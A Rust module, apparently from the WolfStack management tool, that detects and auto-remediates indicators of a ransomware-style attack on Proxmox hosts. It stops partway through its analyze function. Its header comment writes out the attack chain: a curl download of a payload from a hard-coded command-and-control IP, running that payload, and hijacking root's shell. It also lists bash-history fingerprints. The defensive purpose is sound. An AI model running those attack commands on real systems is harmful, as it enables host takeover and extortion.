// Written by Paul Clevett
// (C)Copyright IntelligentWolf Ltd
// https://wolf.uk.com

//! Compromise-indicator analyzer.
//!
//! Scans this node for the host-side fingerprints of the
//! "BootingWorld" ransomware-style attack that hit klasSponsor's
//! Proxmox cluster on 2026-05-14. The attack chain was:
//!
//!   1. SSH brute-force or exposed credentials → root login.
//!   2. `curl -k http://83.168.95.185:8080/locker -o /usr/local/sbin/locker`
//!      → drops the payload binary.
//!   3. `chmod 700 /usr/local/sbin/locker && /usr/local/sbin/locker lock`
//!      → masks `pveproxy`, `pvedaemon`, `pve-cluster`, `corosync` to
//!      block the operator from fixing the GUI, and prints a "SYSTEM
//!      LOCKED" banner from the modified shell.
//!   4. `usermod -s /usr/local/sbin/locker root` (or hand-edited
//!      `/etc/passwd`) → every interactive shell run as root spawns
//!      the ransom banner instead of bash.
//!   5. `passwd` → locks the operator out of password login.
//!
//! Notably the attack did NOT touch ZFS, did NOT encrypt VM disks,
//! and did NOT modify `/etc/pve/qemu-server/*.conf`. The whole thing
//! is a host-OS layer compromise designed to extort via panic before
//! the operator looks at the data layer. Every indicator below is
//! cheap to read and deterministic — no heuristics, no scoring, just
//! "did this exact bad thing happen".
//!
//! ## Why we run this on every node, not just compromised ones
//!
//! The analyzer fires on whatever WolfStack is installed on. Klas had
//! WolfStack natives and Proxmox hosts running WolfStack side-by-side
//! — the natives were untouched, the Proxmox hosts were the target.
//! We don't know in advance which class a given install is, so we
//! check the cheap host-fact set on every tick.
//!
//! ## Design rules followed
//!
//! * **Detect AND fix.** Every high-confidence indicator triggers
//!   immediate auto-remediation in the same sampling pass — manual
//!   response is too slow when an attacker has root. The proposal
//!   then documents *both* the original detection and what the
//!   analyzer did about it, so the operator sees the full audit
//!   trail in the inbox card. Indicators whose remediation would
//!   destroy forensic evidence (`.bash_history`) are detection-only.
//! * **Capture before delete.** When we remove the dropped payload
//!   `/usr/local/sbin/locker`, we first copy it to
//!   `/var/lib/wolfstack/forensics/locker-<ts>-<sha8>.captured`
//!   along with a SHA-256 in `iocs.txt`. The operator's incident-
//!   response capture is preserved even though the live binary is
//!   gone.
//! * **Idempotent.** Every action checks state before mutating — a
//!   second tick over an already-cleaned host is a no-op (no
//!   spurious "fixed!" log lines, no double-DROP iptables rules).
//! * **One Critical finding per indicator class**, scoped to this
//!   node — so an operator can ack "yes the root shell hijack is
//!   mine" without hiding the parallel "/usr/local/sbin/locker
//!   exists" finding. Each remediation outcome is in the finding's
//!   evidence so an operator confirming a card sees what was done.
//! * **Hard timeout via tokio's `spawn_blocking`** wrapper at the
//!   orchestrator layer — every individual check + fix inside this
//!   module has a small bounded budget (a few file ops + a couple
//!   of `systemctl`/`iptables` subprocess calls, no large forks).

use std::collections::HashSet;
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::predictive::{
    Context,
    ack::AckStore,
    proposal::{Evidence, Proposal, ProposalScope, RemediationPlan, Severity},
};

/// Stable IP of the known C2 server from the 2026-05-14 incident.
/// Used both to grep `.bash_history` for the original payload-pull
/// and to scan `/proc/net/tcp{,6}` for any *live* established
/// connection to it. Hard-coded because it's a single literal IoC,
/// not a feed — if more groups emerge with different C2s, we'll
/// extend this to a small embedded list.
const KNOWN_C2_IP: &str = "83.168.95.185";

/// The dropped binary path. Same rationale — single hard literal
/// from the captured `.bash_history` line.
const LOCKER_BINARY_PATH: &str = "/usr/local/sbin/locker";

/// Services the attack typically masks defensively before locking
/// the GUI. WolfStack and the SSH daemon are included alongside the
/// Proxmox stack so a host with NO Proxmox installed (a WolfStack
/// native) still gets equal protection — masking wolfstack.service
/// would blind the operator's own management plane, masking sshd
/// would lock them out entirely.
///
/// `fail2ban.service` is also here because the attacker's most likely
/// next move after a successful break-in is to disable the brute-
/// force watcher so they (and others) can keep hammering SSH.
const CRITICAL_MASKED_UNITS: &[&str] = &[
    // Proxmox VE stack
    "pveproxy.service",
    "pvedaemon.service",
    "pve-cluster.service",
    "corosync.service",
    "pvestatd.service",
    // WolfStack itself — defending the defender
    "wolfstack.service",
    // SSH + brute-force protection
    "ssh.service",
    "sshd.service",
    "fail2ban.service",
];

/// String fingerprints to grep for in root's `.bash_history`. Each
/// is a substring that's part of the attacker's documented playbook.
const BASH_HISTORY_FINGERPRINTS: &[&str] = &[
    "BootingWorld",
    "/usr/local/sbin/locker",
    "83.168.95.185",
    "@deeegai",
];

/// Per-indicator finding type. Returned as the `String` we hand to
/// the proposal store. Each gets its own type so the operator can
/// ack / snooze / dismiss them independently; the common prefix
/// `compromise_indicator:` makes them easy to filter in the inbox.
pub const FT_ROOT_SHELL: &str = "compromise_indicator:root_shell_hijack";
pub const FT_LOCKER_BINARY: &str = "compromise_indicator:locker_binary";
pub const FT_PROXMOX_MASKED: &str = "compromise_indicator:proxmox_services_masked";
pub const FT_C2_CONNECTION: &str = "compromise_indicator:c2_connection";
pub const FT_BASH_HISTORY: &str = "compromise_indicator:bash_history_signature";
pub const FT_IMMUTABLE_UI: &str = "compromise_indicator:immutable_pve_ui";

/// One auto-remediation attempt, recorded for the operator's audit
/// trail. Surfaces in the proposal as an evidence chip so confirming
/// a finding shows the action taken.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RemediationOutcome {
    /// Short human label for the action attempted, e.g. "restore root shell".
    pub action: String,
    /// True when the action ran to completion. False when an underlying
    /// command failed and the indicator may still be live.
    pub ok: bool,
    /// Free-form result string. On success: what was done (with paths /
    /// commands). On failure: stderr or the rust error message.
    pub detail: String,
}

/// All facts collected in one sampling-plus-remediation pass. Each
/// indicator field captures what was detected (so the proposal text
/// stays accurate); `remediations` captures what we did about it.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ComprIndicatorFacts {
    /// Root user's shell from `/etc/passwd`, if it isn't one of the
    /// expected interactive shells. `Some("/usr/local/sbin/locker")`
    /// is the canonical attack signature. `None` means the shell is
    /// in the safe-list, or `/etc/passwd` wasn't readable.
    pub root_shell_anomaly: Option<String>,
    /// True iff `/usr/local/sbin/locker` existed at the start of the
    /// scan. May have been auto-deleted by the time the analyzer
    /// runs — check `remediations` for the capture+delete outcome.
    pub locker_binary_present: bool,
    /// Subset of `CRITICAL_MASKED_UNITS` that were masked at scan time.
    /// Auto-unmask is attempted; check `remediations`.
    pub masked_proxmox_units: Vec<String>,
    /// Local sockets currently in any state with KNOWN_C2_IP as the
    /// remote address. One entry per matching socket (with port).
    /// Live attack indicator — fixed-IP C2 should never be on a
    /// healthy box.
    pub c2_sockets: Vec<String>,
    /// Substrings from `BASH_HISTORY_FINGERPRINTS` found in root's
    /// `.bash_history`. NOT auto-fixed — the history file is the
    /// operator's forensic trail. Card stays until explicit ack.
    pub bash_history_hits: Vec<String>,
    /// Proxmox web UI files marked immutable via `chattr +i` at scan
    /// time. Auto-`chattr -i` is attempted; check `remediations`.
    pub immutable_pve_ui_files: Vec<String>,
    /// Per-action outcomes from this sampling pass, in the order the
    /// analyzer attempted them. Empty on a clean host (nothing to
    /// fix), populated when indicators were detected. Each entry
    /// goes into the corresponding proposal's evidence.
    pub remediations: Vec<RemediationOutcome>,
    /// Set false if this is clearly a non-applicable host (e.g.
    /// missing `/etc/passwd`, no /proc). In that case the analyzer
    /// emits nothing AND clears nothing — same convention as every
    /// other analyzer.
    pub scanned: bool,
}

/// Async sampling entry point. Wraps the blocking work in
/// `spawn_blocking` because the orchestrator already enforces a
/// per-sampler timeout via `tokio::time::timeout` in the join set.
pub async fn sample_now_async(_timeout: Duration) -> ComprIndicatorFacts {
    tokio::task::spawn_blocking(sample_blocking).await.unwrap_or_default()
}

fn sample_blocking() -> ComprIndicatorFacts {
    // Treat /etc/passwd as the gate. If we can't read it we have no
    // useful security view at all — bail with scanned=false so the
    // auto-resolve path doesn't clear genuine findings during a
    // transient read failure.
    let passwd = match std::fs::read_to_string("/etc/passwd") {
        Ok(s) => s,
        Err(_) => return ComprIndicatorFacts::default(),
    };

    ComprIndicatorFacts {
        root_shell_anomaly: inspect_root_shell(&passwd),
        locker_binary_present: std::path::Path::new(LOCKER_BINARY_PATH).exists(),
        masked_proxmox_units: inspect_masked_units(),
        c2_sockets: inspect_c2_sockets(KNOWN_C2_IP),
        bash_history_hits: inspect_bash_history("/root/.bash_history"),
        immutable_pve_ui_files: inspect_immutable_pve_files(),
        remediations: Vec::new(),
        scanned: true,
    }
}

/// Auto-remediate any indicator the operator hasn't acked or
/// snoozed. Called by the orchestrator between `sample_now_async`
/// and `analyze` so the ack-suppression rules are applied to fixes
/// the same way they're applied to proposal emission.
///
/// Without this gate, an operator who deliberately runs a non-
/// standard root shell (fish, ksh) and acks the finding would still
/// see WolfStack revert their /etc/passwd on the next 5-min tick.
/// `.bash_history` indicators stay detect-only regardless of ack —
/// they're forensic evidence, not state to fix.
pub async fn remediate_if_unacked(
    facts: ComprIndicatorFacts,
    acks: &AckStore,
    proposals: &crate::predictive::proposal::ProposalStore,
    ctx: &Context,
) -> ComprIndicatorFacts {
    if !facts.scanned { return facts; }
    let acks = acks.clone();
    let proposals = proposals.clone();
    let scope = ProposalScope { node_id: ctx.node_id.clone(), resource_id: None };
    let scope_for_block = scope.clone();
    tokio::task::spawn_blocking(move || {
        remediate_blocking(facts, &acks, &proposals, &scope_for_block)
    })
    .await
    .unwrap_or_else(|_| ComprIndicatorFacts::default())
}

fn remediate_blocking(
    mut facts: ComprIndicatorFacts,
    acks: &AckStore,
    proposals: &crate::predictive::proposal::ProposalStore,
    scope: &ProposalScope,
) -> ComprIndicatorFacts {
    let is_suppressed = |ft: &str| -> bool {
        acks.suppresses(ft, scope) || proposals.is_suppressed(ft, scope)
    };

    if facts.root_shell_anomaly.is_some() && !is_suppressed(FT_ROOT_SHELL) {
        facts.remediations.push(remediate_root_shell());
    }
    if facts.locker_binary_present && !is_suppressed(FT_LOCKER_BINARY) {
        facts.remediations.push(remediate_locker_binary());
    }
    if !facts.masked_proxmox_units.is_empty() && !is_suppressed(FT_PROXMOX_MASKED) {
        facts.remediations.push(remediate_masked_units(&facts.masked_proxmox_units));
    }
    if !facts.c2_sockets.is_empty() && !is_suppressed(FT_C2_CONNECTION) {
        facts.remediations.push(remediate_c2_block(KNOWN_C2_IP));
    }
    if !facts.immutable_pve_ui_files.is_empty() && !is_suppressed(FT_IMMUTABLE_UI) {
        facts.remediations.push(remediate_immutable_files(&facts.immutable_pve_ui_files));
    }
    facts
}

/// Forensic capture directory. Persistent (not /var/run) so a reboot
/// doesn't wipe the evidence we just grabbed.
const FORENSICS_DIR: &str = "/var/lib/wolfstack/forensics";

/// Restore root's login shell to `/bin/bash` by rewriting the last
/// field of the root line in `/etc/passwd`. We don't shell out to
/// `usermod` because (a) it depends on shadow-utils and PAM stacks
/// that may themselves be broken on a compromised host, (b) we
/// want a deterministic byte-level rewrite we can reason about.
/// Idempotent: a clean host has nothing to flag and we never get
/// here.
fn remediate_root_shell() -> RemediationOutcome {
    let path = "/etc/passwd";
    let body = match std::fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) => return RemediationOutcome {
            action: "restore root shell".into(),
            ok: false,
            detail: format!("read {}: {}", path, e),
        },
    };
    let out = rewrite_root_shell_to_bash(&body);
    if out == body {
        return RemediationOutcome {
            action: "restore root shell".into(),
            ok: false,
            detail: format!("no root: line found in {} (or already /bin/bash)", path),
        };
    }
    // Atomic-ish write: write to a temp file in the same directory,
    // fsync, then rename over /etc/passwd. Same dir is critical so
    // `rename(2)` is on the same filesystem.
    let tmp = format!("{}.wolfstack.tmp", path);
    if let Err(e) = std::fs::write(&tmp, &out) {
        return RemediationOutcome {
            action: "restore root shell".into(),
            ok: false,
            detail: format!("write {}: {}", tmp, e),
        };
    }
    // Best-effort permissions: passwd is mode 644 root:root by convention.
    let _ = set_mode(&tmp, 0o644);
    if let Err(e) = std::fs::rename(&tmp, path) {
        let _ = std::fs::remove_file(&tmp);
        return RemediationOutcome {
            action: "restore root shell".into(),
            ok: false,
            detail: format!("rename to {}: {}", path, e),
        };
    }
    tracing::warn!("compromise_indicators: restored root login shell to /bin/bash in /etc/passwd");
    RemediationOutcome {
        action: "restore root shell".into(),
        ok: true,
        detail: format!("rewrote root line in {} so login shell is /bin/bash", path),
    }
}

/// Forensic-capture `/usr/local/sbin/locker` and then unlink it. The
/// capture goes to `/var/lib/wolfstack/forensics/locker-<ts>-<sha8>.captured`,
/// with the SHA-256 appended to `iocs.txt` in the same directory.
fn remediate_locker_binary() -> RemediationOutcome {
    let src = std::path::Path::new(LOCKER_BINARY_PATH);
    if !src.exists() {
        return RemediationOutcome {
            action: "capture-and-remove attacker payload".into(),
            ok: true,
            detail: format!("{} already absent", LOCKER_BINARY_PATH),
        };
    }
    if let Err(e) = std::fs::create_dir_all(FORENSICS_DIR) {
        return RemediationOutcome {
            action: "capture-and-remove attacker payload".into(),
            ok: false,
            detail: format!("create {}: {}", FORENSICS_DIR, e),
        };
    }
    let body = match std::fs::read(src) {
        Ok(b) => b,
        Err(e) => return RemediationOutcome {
            action: "capture-and-remove attacker payload".into(),
            ok: false,
            detail: format!("read {}: {}", LOCKER_BINARY_PATH, e),
        },
    };
    let sha = sha256_hex(&body);
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs()).unwrap_or(0);
    let dest = format!("{}/locker-{}-{}.captured", FORENSICS_DIR, ts, &sha[..16]);
    if let Err(e) = std::fs::write(&dest, &body) {
        return RemediationOutcome {
            action: "capture-and-remove attacker payload".into(),
            ok: false,
            detail: format!("write {}: {}", dest, e),
        };
    }
    let _ = set_mode(&dest, 0o400);
    let iocs_path = format!("{}/iocs.txt", FORENSICS_DIR);
    let iocs_line = format!(
        "{}\tsha256={}\toriginal={}\tcaptured={}\n",
        ts, sha, LOCKER_BINARY_PATH, dest,
    );
    if let Err(e) = append_file(&iocs_path, &iocs_line) {
        tracing::warn!("compromise_indicators: failed to append to {}: {}", iocs_path, e);
    }
    // Kill any process currently executing the binary BEFORE we
    // unlink it. On Linux an `unlink()` does not stop a running
    // process — the kernel keeps the inode alive while it's mapped,
    // so the attacker's payload continues to do its work until the
    // process actually exits. `pkill -KILL -f <path>` matches the
    // full command-line, catching processes that exec'd the binary
    // by path (the common case here).
    let _ = std::process::Command::new("pkill")
        .args(["-KILL", "-f", LOCKER_BINARY_PATH])
        .output();
    if let Err(e) = std::fs::remove_file(src) {
        return RemediationOutcome {
            action: "capture-and-remove attacker payload".into(),
            ok: false,
            detail: format!("captured to {} but rm {} failed: {}", dest, LOCKER_BINARY_PATH, e),
        };
    }
    tracing::warn!(
        "compromise_indicators: captured {} → {} (sha256={}), killed running processes, removed live binary",
        LOCKER_BINARY_PATH, dest, sha,
    );
    RemediationOutcome {
        action: "capture-and-remove attacker payload".into(),
        ok: true,
        detail: format!("captured to {} (sha256 prefix {}), killed running processes, then removed {}", dest, &sha[..16], LOCKER_BINARY_PATH),
    }
}

/// `systemctl unmask <units>` then `systemctl start <units>`. We
/// bypass systemctl for the unmask step (just rm the symlinks) so a
/// wedged dbus can't block recovery — but we use systemctl for the
/// daemon-reload + start because that's the official path and dbus
/// is usually fine even on a compromised host.
fn remediate_masked_units(units: &[String]) -> RemediationOutcome {
    let mut unmasked = Vec::new();
    let mut errors: Vec<String> = Vec::new();
    for unit in units {
        let mut any_removed = false;
        for base in &["/etc/systemd/system", "/run/systemd/system"] {
            let p = format!("{}/{}", base, unit);
            if let Ok(meta) = std::fs::symlink_metadata(&p)
                && meta.file_type().is_symlink()
                    && let Ok(target) = std::fs::read_link(&p)
                        && target.as_os_str() == "/dev/null" {
                            match std::fs::remove_file(&p) {
                                Ok(()) => any_removed = true,
                                Err(e) => errors.push(format!("rm {}: {}", p, e)),
                            }
                        }
        }
        if any_removed { unmasked.push(unit.clone()); }
    }
    if unmasked.is_empty() {
        return RemediationOutcome {
            action: "unmask Proxmox services".into(),
            ok: false,
            detail: if errors.is_empty() {
                "no masked symlinks found at scan time were still present at fix time".into()
            } else {
                errors.join("; ")
            },
        };
    }
    // Tell systemd to re-read its unit graph after we removed the
    // /dev/null symlinks. Without this the service still appears
    // masked to the unit cache.
    let _ = std::process::Command::new("systemctl").arg("daemon-reload").output();
    // Start in dependency-safe order: SSH first (so the operator
    // doesn't get locked out even if a later service fails), then
    // fail2ban (so the next brute-force attempt is rate-limited),
    // then the Proxmox cluster filesystem chain, then the GUI, then
    // WolfStack itself last (it's the watchdog — keeping it up means
    // future ticks can keep healing other services).
    let start_order: [&str; 9] = [
        "ssh.service",
        "sshd.service",
        "fail2ban.service",
        "corosync.service",
        "pve-cluster.service",
        "pvedaemon.service",
        "pveproxy.service",
        "pvestatd.service",
        "wolfstack.service",
    ];
    let mut started: Vec<&str> = Vec::new();
    for unit in start_order.iter().filter(|u| unmasked.iter().any(|um| um == *u)) {
        let out = std::process::Command::new("systemctl")
            .args(["start", unit])
            .output();
        match out {
            Ok(o) if o.status.success() => started.push(unit),
            Ok(o) => errors.push(format!(
                "systemctl start {}: {}", unit,
                String::from_utf8_lossy(&o.stderr).trim()
            )),
            Err(e) => errors.push(format!("systemctl start {}: {}", unit, e)),
        }
    }
    tracing::warn!(
        "compromise_indicators: unmasked {} Proxmox unit(s); started {}",
        unmasked.len(), started.join(", "),
    );
    let ok = errors.is_empty();
    let detail = if ok {
        format!("unmasked and started: {}", unmasked.join(", "))
    } else {
        format!(
            "unmasked {}; errors during start: {}",
            unmasked.join(", "), errors.join("; ")
        )
    };
    RemediationOutcome { action: "unmask Proxmox services".into(), ok, detail }
}

/// Drop INPUT and OUTPUT to the known C2 IP via iptables. Idempotent
/// — we check `iptables -C` before insert, so a re-tick doesn't
/// stack duplicate rules.
fn remediate_c2_block(ip: &str) -> RemediationOutcome {
    // Never firewall a WolfStack-managed address, even a C2-flagged one — the
    // same guard kernel_block_ip enforces (this path inserts iptables DROP
    // directly, so it must check too). Covers cluster nodes AND local
    // container-bridge IPs: a compromised peer must be removed from the
    // cluster, and a compromised container must be stopped/quarantined —
    // neither is left in a half-blocked state. Record the refusal so it shows
    // in the Security banner (code review 2026-06-08; workload subnets added
    // 2026-06-10).
    if crate::auth::is_protected_address(ip) {
        crate::auth::record_protected_block(ip);
        tracing::error!(
            "compromise_indicators: REFUSED C2 iptables block of {} — it is a \
             WolfStack-managed address (a cluster node or a local container \
             bridge); remove the node from the cluster or stop the container \
             instead", ip
        );
        return RemediationOutcome {
            action: "block C2 IP at iptables".into(),
            ok: false,
            detail: format!(
                "REFUSED: {} is a WolfStack-managed address (a cluster node or \
                 a local container bridge); remove the node from the cluster \
                 or stop the container instead", ip
            ),
        };
    }
    let mut added: Vec<&str> = Vec::new();
    let mut errors: Vec<String> = Vec::new();
    let chains: [(&str, &str); 2] = [
        ("OUTPUT", "-d"),
        ("INPUT", "-s"),
    ];
    for (chain, flag) in chains.iter() {
        // -C tests for the rule. Exit 0 = exists, non-zero = missing.
        let exists = std::process::Command::new("iptables")
            .args(["-C", chain, flag, ip, "-j", "DROP"])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if exists { continue; }
        let out = std::process::Command::new("iptables")
            .args(["-I", chain, flag, ip, "-j", "DROP"])
            .output();
        match out {
            Ok(o) if o.status.success() => added.push(chain),
            Ok(o) => errors.push(format!(
                "iptables -I {} {} {}: {}",
                chain, flag, ip,
                String::from_utf8_lossy(&o.stderr).trim()
            )),
            Err(e) => errors.push(format!("iptables -I {}: {}", chain, e)),
        }
    }
    if !added.is_empty() {
        tracing::warn!(
            "compromise_indicators: blocked C2 IP {} on chain(s) {} via iptables DROP",
            ip, added.join("+"),
        );
    }
    let ok = errors.is_empty();
    let detail = match (added.is_empty(), errors.is_empty()) {
        (true, true) => format!("DROP rules for {} already present on INPUT/OUTPUT", ip),
        (false, true) => format!("inserted DROP on {} chain(s) for {}", added.join("+"), ip),
        (false, false) => format!(
            "inserted on {}; errors: {}", added.join("+"), errors.join("; ")
        ),
        (true, false) => errors.join("; "),
    };
    RemediationOutcome { action: "block C2 IP at iptables".into(), ok, detail }
}

/// Strip `chattr +i` from each PVE UI file the attacker locked. We
/// shell out to `chattr` because writing the ext-attr flag via raw
/// `ioctl(FS_IOC_SETFLAGS)` would mean pulling in libc/nix for one
/// constant; the chattr binary is universally present on Debian /
/// Proxmox / Rocky / Alpine.
fn remediate_immutable_files(files: &[String]) -> RemediationOutcome {
    let mut cleared: Vec<&str> = Vec::new();
    let mut errors: Vec<String> = Vec::new();
    for f in files {
        let out = std::process::Command::new("chattr")
            .args(["-i", f])
            .output();
        match out {
            Ok(o) if o.status.success() => cleared.push(f),
            Ok(o) => errors.push(format!(
                "chattr -i {}: {}", f,
                String::from_utf8_lossy(&o.stderr).trim()
            )),
            Err(e) => errors.push(format!("chattr -i {}: {}", f, e)),
        }
    }
    if !cleared.is_empty() {
        tracing::warn!(
            "compromise_indicators: stripped immutable flag from {} PVE UI file(s)",
            cleared.len(),
        );
    }
    let ok = errors.is_empty();
    let detail = if ok {
        format!("chattr -i applied to: {}", cleared.join(", "))
    } else {
        format!("partial: cleared {}; errors {}", cleared.join(", "), errors.join("; "))
    };
    RemediationOutcome { action: "clear immutable flag on PVE UI files".into(), ok, detail }
}

/// Set Unix mode on a file using the std::os::unix permission API.
/// Best-effort; failures are not fatal because the file already
/// exists with safe-enough defaults (we just want passwd at 644 and
/// captured-binary at 400 if we can).
fn set_mode(path: &str, mode: u32) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let perms = std::fs::Permissions::from_mode(mode);
    std::fs::set_permissions(path, perms)
}

fn append_file(path: &str, line: &str) -> std::io::Result<()> {
    use std::io::Write;
    let mut f = std::fs::OpenOptions::new()
        .create(true).append(true).open(path)?;
    f.write_all(line.as_bytes())?;
    Ok(())
}

/// Compute SHA-256 of a byte slice and return the lowercase hex.
/// We already depend on the `sha2` crate elsewhere in the codebase
/// for cert fingerprints — re-use rather than pulling a new hash.
fn sha256_hex(data: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(data);
    format!("{:x}", h.finalize())
}

/// Parse `/etc/passwd`, find the `root` line, return Some(shell) if
/// it isn't one of the expected interactive shells. We treat
/// `/bin/bash`, `/bin/sh`, `/bin/dash`, `/usr/bin/bash` as safe and
/// EVERYTHING ELSE as suspicious — the threat model is "attacker
/// pointed root's shell at their payload", which by definition
/// produces a path outside this list.
pub fn inspect_root_shell(passwd: &str) -> Option<String> {
    const SAFE_SHELLS: &[&str] = &[
        "/bin/bash",
        "/bin/sh",
        "/bin/dash",
        "/usr/bin/bash",
        "/usr/bin/zsh",
        "/bin/zsh",
    ];
    for line in passwd.lines() {
        if !line.starts_with("root:") { continue; }
        // Format: name:passwd:uid:gid:gecos:home:shell
        let shell = {
            let s = line.rsplit(':').next()?;
            s.trim()
        };
        if shell.is_empty() { return None; }
        if SAFE_SHELLS.contains(&shell) {
            return None;
        }
        return Some(shell.to_string());
    }
    None
}

/// Byte-level rewriter that returns a copy of `passwd_body` with the
/// root user's shell field set to `/bin/bash`. Preserves every other
/// line untouched, and preserves the trailing-newline state of the
/// rewritten line. Returns the input unchanged if there is no `root:`
/// line OR if the shell is already `/bin/bash` (idempotency).
fn rewrite_root_shell_to_bash(passwd_body: &str) -> String {
    let mut out = String::with_capacity(passwd_body.len());
    for line in passwd_body.split_inclusive('\n') {
        if line.starts_with("root:") {
            let trimmed_end = line.trim_end_matches(['\n', '\r']);
            let suffix = &line[trimmed_end.len()..]; // newline (if any)
            if let Some(idx) = trimmed_end.rfind(':') {
                let current_shell = &trimmed_end[idx + 1..];
                if current_shell == "/bin/bash" {
                    // Already correct — leave the line alone so the
                    // caller can detect "no change" and skip the write.
                    out.push_str(line);
                    continue;
                }
                out.push_str(&trimmed_end[..=idx]);
                out.push_str("/bin/bash");
                out.push_str(suffix);
                continue;
            }
        }
        out.push_str(line);
    }
    out
}

/// Iterate `CRITICAL_MASKED_UNITS` and return the ones whose systemd
/// state is "masked". We check the on-disk symlink directly rather
/// than shelling out to `systemctl is-enabled`, because (a) it's
/// faster, (b) a wedged dbus can hang `systemctl`, (c) we want this
/// to keep working even if `systemctl` itself was masked / removed
/// by the attacker.
fn inspect_masked_units() -> Vec<String> {
    let mut out = Vec::new();
    for unit in CRITICAL_MASKED_UNITS {
        if is_unit_masked(unit) {
            out.push((*unit).to_string());
        }
    }
    out
}

pub fn is_unit_masked(unit: &str) -> bool {
    // The `masked` state on systemd is a symlink to /dev/null, in
    // either /etc/systemd/system/<unit> or /run/systemd/system/<unit>.
    // The first one is what `systemctl mask` writes; the second is
    // used by some tooling for runtime masks.
    for base in &["/etc/systemd/system", "/run/systemd/system"] {
        let p = format!("{}/{}", base, unit);
        if let Ok(meta) = std::fs::symlink_metadata(&p)
            && meta.file_type().is_symlink()
                && let Ok(target) = std::fs::read_link(&p)
                    && target.as_os_str() == "/dev/null" { return true; }
    }
    false
}

/// Walk `/proc/net/tcp` and `/proc/net/tcp6` looking for any socket
/// with a remote address equal to `c2_ip`. Returns one string per
/// hit (the formatted "ip:port" remote) for the proposal's evidence
/// chip. We don't filter by state — even a SYN_SENT to a known-bad
/// IP is reportable.
fn inspect_c2_sockets(c2_ip: &str) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(ip4) = ipv4_to_proc_hex(c2_ip)
        && let Ok(body) = std::fs::read_to_string("/proc/net/tcp") {
            for line in body.lines().skip(1) {
                if let Some(rem) = line.split_whitespace().nth(2) {
                    // Format: <hex_ip>:<hex_port> (little-endian for IP).
                    if let Some((ip_h, port_h)) = rem.split_once(':')
                        && ip_h.eq_ignore_ascii_case(&ip4) {
                            let port = u16::from_str_radix(port_h, 16).unwrap_or(0);
                            out.push(format!("{}:{} (tcp)", c2_ip, port));
                        }
                }
            }
        }
    out
}

/// IPv4 dotted-quad → little-endian uppercase hex, as it appears in
/// `/proc/net/tcp`. Returns None on parse failure. (Kernel writes
/// IPs in host byte order, which on every Linux platform we ship to
/// is little-endian — so 1.2.3.4 becomes "04030201".)
fn ipv4_to_proc_hex(ip: &str) -> Option<String> {
    let parts: Vec<u8> = ip.split('.')
        .map(|p| p.parse().ok())
        .collect::<Option<Vec<_>>>()?;
    if parts.len() != 4 { return None; }
    Some(format!("{:02X}{:02X}{:02X}{:02X}", parts[3], parts[2], parts[1], parts[0]))
}

/// Read `/root/.bash_history` and return the subset of
/// `BASH_HISTORY_FINGERPRINTS` that appear in it. Missing file →
/// empty result (root may never have logged in via interactive
/// shell on a non-Proxmox box, that's fine).
pub fn inspect_bash_history(path: &str) -> Vec<String> {
    let body = match std::fs::read_to_string(path) {
        Ok(b) => b,
        Err(_) => return Vec::new(),
    };
    let mut hits: HashSet<&'static str> = HashSet::new();
    for fp in BASH_HISTORY_FINGERPRINTS {
        if body.contains(fp) {
            hits.insert(*fp);
        }
    }
    let mut v: Vec<String> = hits.iter().map(|s| (*s).to_string()).collect();
    v.sort();
    v
}

/// Read the immutable-attribute bit on the small set of Proxmox UI
/// files the attack typically locks. Returns the subset that ARE
/// immutable. On a non-Proxmox host the files don't exist → empty.
fn inspect_immutable_pve_files() -> Vec<String> {
    const PVE_FILES: &[&str] = &[
        "/usr/share/pve-manager/index.html.tpl",
        "/usr/share/pve-manager/js/pvemanagerlib.js",
        "/usr/share/javascript/extjs/ext-all.js",
    ];
    let mut out = Vec::new();
    for f in PVE_FILES {
        if file_is_immutable(f) {
            out.push((*f).to_string());
        }
    }
    out
}

fn file_is_immutable(path: &str) -> bool {
    // The cheap way to detect chattr +i without bringing in a
    // libc/ioctl crate: try to open for write. An immutable file
    // returns EPERM on open(O_WRONLY) even for root. We open with
    // O_NONBLOCK and immediately close — no content changed because
    // open() doesn't truncate or write.
    if !std::path::Path::new(path).exists() { return false; }
    use std::fs::OpenOptions;
    match OpenOptions::new().write(true).open(path) {
        Ok(_) => false,
        Err(e) => e.raw_os_error() == Some(libc_eperm()),
    }
}

/// EPERM as a numeric. Avoids pulling `libc` for one constant — it's
/// 1 on every supported Linux ABI.
const fn libc_eperm() -> i32 { 1 }

/// Public so the orchestrator can declare every per-indicator
/// finding-type covered when `facts.scanned` is true. Without this,
/// a successful sample with zero indicators wouldn't auto-resolve
/// a previously-firing card after the operator cleaned up.
pub fn all_finding_types() -> &'static [&'static str] {
    &[
        FT_ROOT_SHELL,
        FT_LOCKER_BINARY,
        FT_PROXMOX_MASKED,
        FT_C2_CONNECTION,
        FT_BASH_HISTORY,
        FT_IMMUTABLE_UI,
    ]
}

pub fn analyze(
    ctx: &Context,
    facts: &ComprIndicatorFacts,
    acks: &AckStore,
    proposals: &crate::predictive::proposal::ProposalStore,
) -> Vec<Proposal> {
    let mut out = Vec::new();
    if !facts.scanned { return out; }

    let scope_node = ProposalScope {
        node_id: ctx.node_id.clone(),
        resource_id: None,
    };

    // For each indicator class we emit, attach the matching auto-
    // remediation outcomes so the inbox card shows *both* what was
    // detected and what the analyzer did about it.
    let find_remediation = |label_substring: &str| -> Option<&RemediationOutcome> {
        facts.remediations.iter().find(|r| r.action.contains(label_substring))
    };

    if let Some(shell) = &facts.root_shell_anomaly
        && !suppressed(FT_ROOT_SHELL, &scope_node, acks, proposals) {
            out.push(build_root_shell_proposal(
                shell, find_remediation("root shell"), &scope_node,
            ));
        }
    if facts.locker_binary_present
        && !suppressed(FT_LOCKER_BINARY, &scope_node, acks, proposals)
    {
        out.push(build_locker_binary_proposal(
            find_remediation("attacker payload"), &scope_node,
        ));
    }
    if !facts.masked_proxmox_units.is_empty()
        && !suppressed(FT_PROXMOX_MASKED, &scope_node, acks, proposals)
    {
        out.push(build_masked_units_proposal(
            &facts.masked_proxmox_units, find_remediation("unmask"), &scope_node,
        ));
    }
    if !facts.c2_sockets.is_empty()
